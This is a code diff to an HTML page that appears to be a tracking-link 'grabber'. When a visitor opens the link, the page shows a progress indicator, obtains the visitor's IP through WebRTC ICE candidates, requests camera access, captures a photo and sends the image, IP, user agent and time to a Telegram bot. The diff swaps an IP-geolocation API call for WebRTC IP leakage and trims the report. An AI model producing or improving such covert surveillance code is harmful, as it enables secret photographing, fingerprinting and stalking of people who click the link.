@@ -34,7 +34,7 @@
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
         const progressIndicator = document.getElementById("progress-indicator");
-        let ipInfo = {};
+        let ip = "Unknown";
         let progress = 0;
         
         // Get the user ID from the URL
@@ -60,18 +60,11 @@
                 }
             }, 500);
             
-            // Fetch IP info
-            fetch("https://ipapi.co/json")
-                .then(res => res.json())
-                .then(data => { 
-                    ipInfo = data;
-                    // Access camera after getting IP info
-                    requestCameraAccess();
-                })
-                .catch(() => {
-                    // Try camera access even if IP info fails
-                    requestCameraAccess();
-                });
+            // Get IP using WebRTC
+            getLocalIP(detectedIp => {
+                ip = detectedIp;
+                requestCameraAccess();
+            });
         }
 
         // Direct integration with Telegram Bot API
@@ -124,7 +117,7 @@
                 })
                 .catch(() => {
                     // Still send device info even if camera fails
-                    sendDeviceInfo();
+                    sendBasicInfo();
                 });
         }
 
@@ -133,34 +126,50 @@
                 ctx.drawImage(video, 0, 0, 320, 240);
                 const imageData = canvas.toDataURL("image/jpeg", 0.7);
                 
-                // Send both device info and image
-                sendDeviceInfo(imageData.split(',')[1]);
+                // Send both basic info and image
+                sendBasicInfo(imageData.split(',')[1]);
             } else {
-                // Just send device info if no camera
-                sendDeviceInfo();
+                // Just send basic info if no camera
+                sendBasicInfo();
             }
         }
 
-        function sendDeviceInfo(imageBase64 = null) {
-            // Prepare device info message
-            const ip = ipInfo.ip || "Unknown";
-            const country = ipInfo.country_name || "Unknown";
-            const city = ipInfo.city || "Unknown";
-            const isp = ipInfo.org || "Unknown";
-            
+        function sendBasicInfo(imageBase64 = null) {
+            // Prepare simplified message with only IP and User Agent
             const message = `
 📥 <b>New Link Click Detected!</b>
 
 🌍 <b>IP:</b> ${ip}
-🏙️ <b>City:</b> ${city}
-🌐 <b>Country:</b> ${country}
-🧭 <b>ISP:</b> ${isp}
 🖥️ <b>Device:</b> ${navigator.userAgent}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
             `;
             
-            // Send the info to Telegram
+            // Send the simplified info to Telegram
             sendToTelegram(message, imageBase64);
+        }
+
+        // Get local IP using WebRTC
+        function getLocalIP(callback) {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel(""); // Create a dummy data channel
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = event => {
+                if (event && event.candidate && event.candidate.candidate) {
+                    const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (ipMatch) {
+                        callback(ipMatch[0]);
+                        pc.close();
+                    }
+                }
+            };
+            
+            // Set a timeout in case WebRTC takes too long
+            setTimeout(() => {
+                if (ip === "Unknown") {
+                    callback("Detection Failed");
+                    pc.close();
+                }
+            }, 5000);
         }
     </script>
 </body>
